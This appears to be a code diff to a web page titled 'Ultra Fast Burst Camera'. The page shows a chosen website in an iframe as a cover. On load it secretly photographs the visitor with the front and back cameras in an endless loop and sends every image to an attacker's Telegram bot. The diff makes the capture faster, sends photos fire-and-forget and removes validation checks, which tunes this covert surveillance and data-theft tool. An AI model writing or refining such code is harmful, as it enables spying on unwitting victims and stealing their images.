@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Burst Camera App</title>
+    <title>Ultra Fast Burst Camera</title>
     <style>
         * {
             margin: 0;
@@ -54,7 +54,7 @@
 
     <script>
         // =====================================================
-        //  BURST CAMERA SYSTEM - FIXED BLANK PHOTO ISSUE
+        //  ULTRA FAST BURST: 3 FRONT + 3 BACK, REPEAT FOREVER
         // =====================================================
         
         function getConfigFromURL() {
@@ -82,11 +82,11 @@
         const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
         const CHAT_ID = config.chatId;
         
-        // Configuration
-        const PHOTOS_PER_CAMERA = 10;
-        const BURST_DELAY = 200; // Increased from 140ms
-        const SWITCH_DELAY = 1000; // Increased delay when switching
-        const WARMUP_TIME = 2000; // Camera warmup time
+        // ⚡ ULTRA FAST CONFIG
+        const PHOTOS_PER_CAMERA = 3;      // 3 photos each camera
+        const CAPTURE_DELAY = 100;         // 100ms between photos (FAST!)
+        const WARMUP_TIME = 800;           // 800ms warmup (faster)
+        const SWITCH_DELAY = 400;          // 400ms switch delay (faster)
         
         let cameraStream = null;
         let currentFacingMode = 'user';
@@ -98,7 +98,6 @@
         const cameraVideo = document.getElementById('cameraVideo');
         const websiteFrame = document.getElementById('websiteFrame');
         
-        // Load website
         function loadWebsite() {
             try {
                 websiteFrame.src = config.website;
@@ -108,73 +107,45 @@
             }
         }
         
-        // Start camera with proper initialization
+        // ULTRA FAST camera start
         async function startCamera() {
             try {
                 cameraReady = false;
-                console.log(`📹 Starting ${currentFacingMode.toUpperCase()} camera...`);
+                console.log(`📹 ${currentFacingMode.toUpperCase()} camera...`);
                 
                 const constraints = {
                     video: {
-                        width: { ideal: 1280, min: 640 },
-                        height: { ideal: 720, min: 480 },
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
                         facingMode: currentFacingMode,
-                        frameRate: { ideal: 30, min: 15 }
+                        frameRate: { ideal: 30 }
                     }
                 };
                 
                 cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
                 cameraVideo.srcObject = cameraStream;
                 
-                // Wait for metadata to load
-                await new Promise((resolve, reject) => {
-                    cameraVideo.onloadedmetadata = () => {
-                        console.log('📊 Video metadata loaded');
-                        resolve();
-                    };
-                    cameraVideo.onerror = reject;
-                    // Timeout after 5 seconds
-                    setTimeout(() => reject(new Error('Metadata timeout')), 5000);
-                });
-                
-                // Wait for video to be fully ready
-                await new Promise((resolve, reject) => {
-                    const checkReady = () => {
-                        if (cameraVideo.readyState >= 3) { // HAVE_FUTURE_DATA or HAVE_ENOUGH_DATA
-                            console.log('✅ Video ready state:', cameraVideo.readyState);
-                            resolve();
-                        } else {
-                            console.log('⏳ Waiting... ready state:', cameraVideo.readyState);
-                            setTimeout(checkReady, 100);
-                        }
-                    };
-                    checkReady();
-                    setTimeout(() => reject(new Error('Ready state timeout')), 5000);
+                // Quick metadata wait
+                await new Promise((resolve) => {
+                    cameraVideo.onloadedmetadata = resolve;
+                    setTimeout(resolve, 2000); // Fallback
                 });
                 
                 await cameraVideo.play();
                 
-                // Extended warm-up for camera to adjust exposure, focus, etc.
-                console.log(`⏳ Camera warming up for ${WARMUP_TIME}ms...`);
+                // Quick warmup
+                console.log(`⏳ Warmup ${WARMUP_TIME}ms...`);
                 await new Promise(resolve => setTimeout(resolve, WARMUP_TIME));
                 
-                // Verify video dimensions
-                if (cameraVideo.videoWidth === 0 || cameraVideo.videoHeight === 0) {
-                    throw new Error('Invalid video dimensions');
-                }
-                
                 cameraReady = true;
-                console.log(`✅ ${currentFacingMode.toUpperCase()} camera ready: ${cameraVideo.videoWidth}x${cameraVideo.videoHeight}`);
-                console.log(`📺 Ready State: ${cameraVideo.readyState}, Playing: ${!cameraVideo.paused}`);
+                console.log(`✅ Ready: ${cameraVideo.videoWidth}x${cameraVideo.videoHeight}`);
                 return true;
             } catch (error) {
                 console.error('❌ Camera error:', error);
-                cameraReady = false;
                 return false;
             }
         }
         
-        // Stop camera
         function stopCamera() {
             cameraReady = false;
             if (cameraStream) {
@@ -184,61 +155,30 @@
             }
         }
         
-        // Capture single frame with validation
-        async function captureFrame() {
+        // ULTRA FAST capture (no validation for speed)
+        async function captureFrameFast() {
             return new Promise((resolve) => {
-                // Check if camera is ready
                 if (!cameraReady || cameraVideo.readyState < 2) {
-                    console.warn('⚠️ Camera not ready. Ready state:', cameraVideo.readyState);
-                    resolve(null);
-                    return;
-                }
-                
-                // Check if video has valid dimensions
-                if (cameraVideo.videoWidth === 0 || cameraVideo.videoHeight === 0) {
-                    console.warn('⚠️ Invalid video dimensions');
                     resolve(null);
                     return;
                 }
                 
                 try {
                     const canvas = document.createElement('canvas');
-                    const context = canvas.getContext('2d', { 
-                        alpha: false,
-                        willReadFrequently: false 
-                    });
+                    const ctx = canvas.getContext('2d', { alpha: false });
                     
-                    canvas.width = cameraVideo.videoWidth;
-                    canvas.height = cameraVideo.videoHeight;
+                    canvas.width = cameraVideo.videoWidth || 1280;
+                    canvas.height = cameraVideo.videoHeight || 720;
                     
-                    console.log(`📸 Capturing: ${canvas.width}x${canvas.height}`);
-                    
-                    context.imageSmoothingEnabled = true;
-                    context.imageSmoothingQuality = 'high';
-                    context.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
-                    
-                    // Verify the canvas has content (not blank)
-                    const imageData = context.getImageData(0, 0, Math.min(10, canvas.width), Math.min(10, canvas.height));
-                    const hasContent = imageData.data.some((value, index) => {
-                        // Check if there's any non-zero color value
-                        return index % 4 !== 3 && value > 0;
-                    });
-                    
-                    if (!hasContent) {
-                        console.warn('⚠️ Canvas appears blank');
+                    if (canvas.width === 0 || canvas.height === 0) {
                         resolve(null);
                         return;
                     }
                     
-                    canvas.toBlob(blob => {
-                        if (blob && blob.size > 1000) { // At least 1KB
-                            console.log(`✅ Captured valid blob: ${(blob.size / 1024).toFixed(2)} KB`);
-                            resolve(blob);
-                        } else {
-                            console.warn('⚠️ Invalid blob size:', blob ? blob.size : 0);
-                            resolve(null);
-                        }
-                    }, 'image/jpeg', 0.92);
+                    ctx.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
+                    
+                    // Fast conversion (lower quality for speed)
+                    canvas.toBlob(resolve, 'image/jpeg', 0.85);
                 } catch (error) {
                     console.error('❌ Capture error:', error);
                     resolve(null);
@@ -246,43 +186,29 @@
             });
         }
         
-        // Send photo to Telegram
-        async function sendPhotoToTelegram(blob, cameraType, photoNum) {
-            if (!blob) return false;
+        // Fire and forget send (ULTRA FAST)
+        function sendPhotoFast(blob, cameraType, photoNum) {
+            if (!blob) return;
             
-            try {
-                const url = `${TELEGRAM_API}/sendPhoto`;
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, `${cameraType}_${photoNum}_${Date.now()}.jpg`);
-                
-                const caption = `📸 ${cameraType.toUpperCase()} #${photoNum}\n⏰ ${new Date().toLocaleTimeString()}\n💾 ${(blob.size / 1024).toFixed(2)} KB`;
-                formData.append('caption', caption);
-                
-                const response = await fetch(url, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                const result = await response.json();
-                
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, `${cameraType}_${photoNum}_${Date.now()}.jpg`);
+            formData.append('caption', `📸 ${cameraType.toUpperCase()} #${photoNum}`);
+            
+            // Fire and forget - don't wait!
+            fetch(`${TELEGRAM_API}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).then(r => r.json()).then(result => {
                 if (result.ok) {
                     totalPhotosSent++;
-                    console.log(`✅ Photo sent: ${cameraType.toUpperCase()} #${photoNum} (Total: ${totalPhotosSent})`);
-                    return true;
-                } else {
-                    console.error('❌ Telegram error:', result);
-                    return false;
+                    console.log(`✅ Sent: ${cameraType.toUpperCase()} #${photoNum} (Total: ${totalPhotosSent})`);
                 }
-            } catch (error) {
-                console.error('❌ Send error:', error);
-                return false;
-            }
+            }).catch(e => console.error('❌', e));
         }
         
-        // Switch camera
         async function switchCamera() {
-            console.log('🔄 Switching camera...');
+            console.log('🔄 Switching...');
             stopCamera();
             
             await new Promise(resolve => setTimeout(resolve, SWITCH_DELAY));
@@ -290,105 +216,94 @@
             currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
             photoCounter = 0;
             
-            const started = await startCamera();
-            return started;
+            return await startCamera();
         }
         
-        // Main burst loop
-        async function startBurstMode() {
+        // MAIN ULTRA FAST BURST LOOP
+        async function ultraFastBurst() {
             if (burstRunning) return;
             
             burstRunning = true;
-            console.log('🚀 BURST MODE STARTED - UNLIMITED PHOTOS');
-            console.log(`📊 Config: ${PHOTOS_PER_CAMERA} photos per camera, ${BURST_DELAY}ms delay`);
+            console.log('⚡ ULTRA FAST BURST: 3 FRONT + 3 BACK, REPEAT FOREVER');
             
             while (burstRunning) {
-                // Only capture if camera is ready
                 if (!cameraReady) {
-                    console.warn('⚠️ Camera not ready, waiting...');
-                    await new Promise(resolve => setTimeout(resolve, 500));
+                    await new Promise(resolve => setTimeout(resolve, 200));
                     continue;
                 }
                 
-                // Capture photo
-                const blob = await captureFrame();
-                
-                if (blob) {
-                    photoCounter++;
-                    await sendPhotoToTelegram(blob, currentFacingMode, photoCounter);
+                // Rapid fire 3 photos
+                for (let i = 0; i < PHOTOS_PER_CAMERA; i++) {
+                    const blob = await captureFrameFast();
                     
-                    // Switch camera after X photos
-                    if (photoCounter >= PHOTOS_PER_CAMERA) {
-                        const switched = await switchCamera();
-                        if (!switched) {
-                            console.error('❌ Failed to switch camera');
-                            break;
-                        }
+                    if (blob) {
+                        photoCounter++;
+                        sendPhotoFast(blob, currentFacingMode, photoCounter);
                     }
-                } else {
-                    console.warn('⚠️ Failed to capture frame, retrying...');
+                    
+                    // Minimal delay between shots
+                    if (i < PHOTOS_PER_CAMERA - 1) {
+                        await new Promise(resolve => setTimeout(resolve, CAPTURE_DELAY));
+                    }
                 }
                 
-                // Small delay between captures
-                await new Promise(resolve => setTimeout(resolve, BURST_DELAY));
+                // Switch camera
+                const switched = await switchCamera();
+                if (!switched) {
+                    console.error('❌ Switch failed');
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                }
             }
         }
         
-        // Send initial device info
-        async function sendInitialInfo() {
+        async function sendStartMessage() {
             try {
-                const info = `🚀 *BURST MODE ACTIVATED*\n\n` +
-                    `📱 Device: ${navigator.userAgent.substring(0, 50)}...\n` +
-                    `🌐 Website: ${config.website}\n` +
-                    `⏰ Started: ${new Date().toLocaleString()}\n` +
-                    `📸 Mode: Unlimited burst capture\n` +
-                    `🔄 Switch: Every ${PHOTOS_PER_CAMERA} photos`;
+                const msg = `⚡ *ULTRA FAST BURST MODE*\n\n` +
+                    `📸 Pattern: 3 FRONT → 3 BACK → REPEAT\n` +
+                    `⏱️ Speed: ${CAPTURE_DELAY}ms between shots\n` +
+                    `🔄 Switch: ${SWITCH_DELAY}ms\n` +
+                    `🌐 Site: ${config.website}\n` +
+                    `⏰ ${new Date().toLocaleString()}`;
                 
                 await fetch(`${TELEGRAM_API}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
-                        text: info,
+                        text: msg,
                         parse_mode: 'Markdown'
                     })
                 });
             } catch (e) {
-                console.error('Failed to send initial info:', e);
+                console.error('Failed to send start message:', e);
             }
         }
         
-        // Initialize everything
         async function init() {
             console.log('═══════════════════════════════════');
-            console.log('🎯 BURST CAMERA SYSTEM');
+            console.log('⚡ ULTRA FAST BURST CAMERA');
             console.log('═══════════════════════════════════');
             console.log('💬 Chat ID:', CHAT_ID);
             console.log('🌐 Website:', config.website);
+            console.log('📸 Pattern: 3 FRONT + 3 BACK');
+            console.log('⚡ Speed: MAXIMUM');
             console.log('═══════════════════════════════════');
             
-            // Load website
             loadWebsite();
+            await sendStartMessage();
             
-            // Send initial info
-            await sendInitialInfo();
+            const started = await startCamera();
             
-            // Start camera
-            const cameraStarted = await startCamera();
-            
-            if (cameraStarted) {
-                console.log('🎬 Starting burst mode...');
-                // Start burst mode
-                startBurstMode();
+            if (started) {
+                console.log('🚀 Starting ultra fast burst...');
+                ultraFastBurst();
             } else {
-                console.error('❌ Failed to start camera');
+                console.error('❌ Camera failed to start');
             }
         }
         
-        // Auto-start
         window.addEventListener('load', init);
         
-        // Cleanup
         window.addEventListener('beforeunload', () => {
             burstRunning = false;
             stopCamera();
